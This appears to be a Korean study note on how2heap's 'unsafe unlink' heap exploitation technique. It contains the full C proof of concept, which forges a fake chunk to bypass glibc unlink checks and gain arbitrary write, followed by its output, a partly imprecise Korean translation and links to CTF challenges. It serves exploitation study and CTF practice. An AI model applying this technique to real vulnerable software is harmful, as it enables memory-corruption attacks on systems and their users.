# How2Heap Study 04 Unsafe Unlink

## Tech Overview

Exploiting free on a corrupted chunk to get arbitrary write.

## Source

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>


uint64_t *chunk0_ptr;

int main()
{
    fprintf(stderr, "Welcome to unsafe unlink 2.0!\n");
    fprintf(stderr, "Tested in Ubuntu 14.04/16.04 64bit.\n");
    fprintf(stderr, "This technique can be used when you have a pointer at a known location to a region you can call unlink on.\n");
    fprintf(stderr, "The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.\n");

    int malloc_size = 0x80; //we want to be big enough not to use fastbins
    int header_size = 2;

    fprintf(stderr, "The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.\n\n");

    chunk0_ptr = (uint64_t*) malloc(malloc_size); //chunk0
    uint64_t *chunk1_ptr  = (uint64_t*) malloc(malloc_size); //chunk1
    fprintf(stderr, "The global chunk0_ptr is at %p, pointing to %p\n", &chunk0_ptr, chunk0_ptr);
    fprintf(stderr, "The victim chunk we are going to corrupt is at %p\n\n", chunk1_ptr);

    fprintf(stderr, "We create a fake chunk inside chunk0.\n");
    fprintf(stderr, "We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.\n");
    chunk0_ptr[2] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*3);
    fprintf(stderr, "We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.\n");
    fprintf(stderr, "With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False\n");
    chunk0_ptr[3] = (uint64_t) &chunk0_ptr-(sizeof(uint64_t)*2);
    fprintf(stderr, "Fake chunk fd: %p\n",(void*) chunk0_ptr[2]);
    fprintf(stderr, "Fake chunk bk: %p\n\n",(void*) chunk0_ptr[3]);

    fprintf(stderr, "We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (chunk+size)\n");
    fprintf(stderr, "With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False\n");
    fprintf(stderr, "P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&(~ 0x7))\n");
    fprintf(stderr, "If x = chunk0_ptr[1] & (~ 0x7), that is x = *(chunk0_ptr + x).\n");
    fprintf(stderr, "We just need to set the *(chunk0_ptr + x) = x, so we can pass the check\n");
    fprintf(stderr, "1.Now the x = chunk0_ptr[1]&(~0x7) = 0, we should set the *(chunk0_ptr + 0) = 0, in other words we should do nothing\n");
    fprintf(stderr, "2.Further more we set chunk0_ptr = 0x8 in 64-bits environment, then *(chunk0_ptr + 0x8) == chunk0_ptr[1], it's fine to pass\n");
    fprintf(stderr, "3.Finally we can also set chunk0_ptr[1] = x in 64-bits env, and set *(chunk0_ptr+x)=x,for example chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20\n");
    chunk0_ptr[1] = sizeof(size_t);
    fprintf(stderr, "In this case we set the 'size' of our fake chunk so that chunk0_ptr + size (%p) == chunk0_ptr->size (%p)\n", ((char *)chunk0_ptr + chunk0_ptr[1]), &chunk0_ptr[1]);
    fprintf(stderr, "You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30\n\n");

    fprintf(stderr, "We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.\n");
    uint64_t *chunk1_hdr = chunk1_ptr - header_size;
    fprintf(stderr, "We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.\n");
    fprintf(stderr, "It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly\n");
    chunk1_hdr[0] = malloc_size;
    fprintf(stderr, "If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: %p\n",(void*)chunk1_hdr[0]);
    fprintf(stderr, "We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.\n\n");
    chunk1_hdr[1] &= ~1;

    fprintf(stderr, "Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.\n");
    fprintf(stderr, "You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344\n\n");
    free(chunk1_ptr);

    fprintf(stderr, "At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.\n");
    char victim_string[8];
    strcpy(victim_string,"Hello!~");
    chunk0_ptr[3] = (uint64_t) victim_string;

    fprintf(stderr, "chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.\n");
    fprintf(stderr, "Original value: %s\n",victim_string);
    chunk0_ptr[0] = 0x4141414142424242LL;
    fprintf(stderr, "New Value: %s\n",victim_string);
}
```

## Output

```
Welcome to unsafe unlink 2.0!
Tested in Ubuntu 14.04/16.04 64bit.
This technique can be used when you have a pointer at a known location to a region you can call unlink on.
The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.
The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.

The global chunk0_ptr is at 0x602070, pointing to 0x24f1010
The victim chunk we are going to corrupt is at 0x24f10a0

We create a fake chunk inside chunk0.
We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.
We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.
With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False
Fake chunk fd: 0x602058
Fake chunk bk: 0x602060

We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (chunk+size)
With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False
P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&(~ 0x7))
If x = chunk0_ptr[1] & (~ 0x7), that is x = *(chunk0_ptr + x).
We just need to set the *(chunk0_ptr + x) = x, so we can pass the check
1.Now the x = chunk0_ptr[1]&(~0x7) = 0, we should set the *(chunk0_ptr + 0) = 0, in other words we should do nothing
2.Further more we set chunk0_ptr = 0x8 in 64-bits environment, then *(chunk0_ptr + 0x8) == chunk0_ptr[1], it's fine to pass
3.Finally we can also set chunk0_ptr[1] = x in 64-bits env, and set *(chunk0_ptr+x)=x,for example chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20
In this case we set the 'size' of our fake chunk so that chunk0_ptr + size (0x24f1018) == chunk0_ptr->size (0x24f1018)
You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30

We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.
We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.
It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly
If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80
We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.

Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.
You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344

At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.
chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.
Original value: Hello!~
New Value: BBBBAAAA
```

## 개요 번역

Exploiting free on a corrupted chunk to get arbitrary write.
임의로 어떤 값을 쓰기 위해 올바르지 않은(깨진) 청크에 `free` 함수를 이용합니다.

(번역은 완벽하지 않으며, 추후 수정될 수 있습니다.)

## 출력 번역

```
Welcome to unsafe unlink 2.0!
unsafe unlink 2.0에 오신 것을 환영합니다.

Tested in Ubuntu 14.04/16.04 64bit.
우분투 14.04 / 16.04 64비트에서 테스트 되었습니다.

This technique can be used when you have a pointer at a known location to a region you can call unlink on.
이 기술은 당신이 unlink 함수를 호출할 수 있는 위치에 있는 포인터 중 주소값을 알고 있을 때 사용할 수 있습니다.

The most common scenario is a vulnerable buffer that can be overflown and has a global pointer.
제일 일반적인 상황은 버퍼 오버플로우 취약점이 있고, 글로벌 포인터를 가지고 있을 때 입니다.

The point of this exercise is to use free to corrupt the global chunk0_ptr to achieve arbitrary memory write.
이 훈련의 요점은 free를 chunk0_ptr 전역변수를 손상시켜 임의의 메모리 쓰기를 달성하는 것입니다.

The global chunk0_ptr is at 0x602070, pointing to 0x24f1010
chunk0_ptr 은 0x602070에 있고, 0x24f1010를 가리키고 있습니다.

The victim chunk we are going to corrupt is at 0x24f10a0
손상시킬 타겟 청크는 0x24f10a0 입니다.

We create a fake chunk inside chunk0.
chunk0 안에 가짜 청크를 만듭니다.

We setup the 'next_free_chunk' (fd) of our fake chunk to point near to &chunk0_ptr so that P->fd->bk = P.
next_free_chunk 가 가짜 청크인 &chunk0_ptr 근처를 가리키도록 P->fd->bk = P 를 사용합니다.

We setup the 'previous_free_chunk' (bk) of our fake chunk to point near to &chunk0_ptr so that P->bk->fd = P.
previous_free_chunk 가 가짜 청크인 &chunk0_ptr 근처를 가리키도록 P->bk->fd = P 를 사용합니다.

With this setup we can pass this check: (P->fd->bk != P || P->bk->fd != P) == False
이 설정과 함께면 (P->fd->bk != P || P->bk->fd != P) == False 를 성립하게 할 수 있다.

Fake chunk fd: 0x602058
가짜 청크 fd 는 0x602058 입니다.

Fake chunk bk: 0x602060
가짜 청크 bk 는 0x602060 입니다.

We need to make sure the 'size' of our fake chunk matches the 'previous_size' of the next chunk (chunk+size)
가짜 청크의 `size` 를 다음 청크의 `previous_size` (chunk + size) 와 맞춰줄 필요가 있습니다.

With this setup we can pass this check: (chunksize(P) != prev_size (next_chunk(P)) == False
이 과정을 통해 (chunksize(P) != prev_size (next_chunk(P)) == False 를 통과할 수 있게 됩니다.

P = chunk0_ptr, next_chunk(P) == (mchunkptr) (((char *) (p)) + chunksize (p)) == chunk0_ptr + (chunk0_ptr[1]&(~ 0x7))

If x = chunk0_ptr[1] & (~ 0x7), that is x = *(chunk0_ptr + x).

We just need to set the *(chunk0_ptr + x) = x, so we can pass the check
*(chunk0_ptr + x) = x 로 맞춰줘야 검사를 통과할 수 있습니다.

1.Now the x = chunk0_ptr[1]&(~0x7) = 0, we should set the *(chunk0_ptr + 0) = 0, in other words we should do nothing
1. 이제 x = chunk0_ptr[1]&(~0x7) = 0 이고, *(chunk0_ptr + 0) = 0 이도록 설정해줘야 하며, 다시 말하면 아무것도 하지 말아야 합니다.

2.Further more we set chunk0_ptr = 0x8 in 64-bits environment, then *(chunk0_ptr + 0x8) == chunk0_ptr[1], it's fine to pass
2. 더 나아가 64비트 환경에서는 chunk0_ptr = 0x8 이라면, *(chunk0_ptr + 0x8) == chunk0_ptr[1] 이기 때문에 통과할 수 있습니다.

3.Finally we can also set chunk0_ptr[1] = x in 64-bits env, and set *(chunk0_ptr+x)=x,for example chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20
3. 마지막으로 또한 64비트 환경에서 chunk0_ptr[1] = x, 그리고 *(chunk0_ptr+x)=x 이도록 설정해야 합니다.
예를 들면 chunk_ptr0[1] = 0x20, chunk_ptr0[4] = 0x20 와 같습니다.

In this case we set the 'size' of our fake chunk so that chunk0_ptr + size (0x24f1018) == chunk0_ptr->size (0x24f1018)
이 상황에서 가짜 청크의 'size' 가 chunk0_ptr + size == chunk0_ptr->size 이도록 설정해야 합니다.

You can find the commitdiff of this check at https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
다음 url 에서 이 검사에 대한 수정 변경사항을 찾을 수 있습니다. https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30

We assume that we have an overflow in chunk0 so that we can freely change chunk1 metadata.
자유롭게 chunk1 의 정보를 바꿀수 있도록 chunk0 에서 오버플로우를 발생한다고 가정하였습니다.

We shrink the size of chunk0 (saved as 'previous_size' in chunk1) so that free will think that chunk0 starts where we placed our fake chunk.
free 함수가 chunk0 이 만들어놓았던 가짜 청크에서부터 시작한다고 생각하도록 chunk0 의 크기(chunk1 에서는 `previous_size` 에 저장되어 있다.)를 줄일 것입니다.

It's important that our fake chunk begins exactly where the known pointer points and that we shrink the chunk accordingly
가짜 청크가 정확히 알고 있는 포인터의 정확한 위치라는 것은 중요하며, 이에 따라 청크를 축소해야 합니다.

If we had 'normally' freed chunk0, chunk1.previous_size would have been 0x90, however this is its new value: 0x80
만약 '평범하게' 해제한 0x90 값을 가진 chunk0, chunk1.previous_size 를 가지고 있더라도, 이제는 0x80 을 가지게 될 것입니다.

We mark our fake chunk as free by setting 'previous_in_use' of chunk1 as False.
chunk1 의 'previous_in_use' 를 free를 통해 False로 설정하도록 가짜 청크를 변경해야 합니다.

Now we free chunk1 so that consolidate backward will unlink our fake chunk, overwriting chunk0_ptr.
이제 chunk1 을 해제함으로써 뒤dml 청크를 통합하고, chunk0_ptr을 덮어써 가짜 청크를 unlink 할 것입니다.

You can find the source of the unlink macro at https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/malloc.c;h=ef04360b918bceca424482c6db03cc5ec90c3e00;hb=07c18a008c2ed8f5660adba2b778671db159a141#l1344
unlink 매크로 소스는 해당 링크에서 찾을 수 있습니다.

At this point we can use chunk0_ptr to overwrite itself to point to an arbitrary location.
이 지점에서, chunk0_ptr 을 임의의 위치를 가리키는 포인터가 되도록 덮어쓸 수 있습니다.

chunk0_ptr is now pointing where we want, we use it to overwrite our victim string.
chunk0_ptr는 이제 원하는 지점을 가리키고 있고, 이것을 공격 대상 문자열을 덮어쓰는데 사용할 수 있습니다.

Original value: Hello!~
원래 값 : Hello!~

New Value: BBBBAAAA
새로운 값 : BBBBAAAA
```

## Applicable CTF Challenges
(적용 가능한 CTF 문제들)

* HITCON CTF 2014-stkof - [블로그]() / [바이너리](https://github.com/sunghun7511/Writeup/tree/master/ctf/)
* Insomni'hack 2017-Wheel of Robots - [블로그]() / [바이너리](https://github.com/sunghun7511/Writeup/tree/master/ctf/)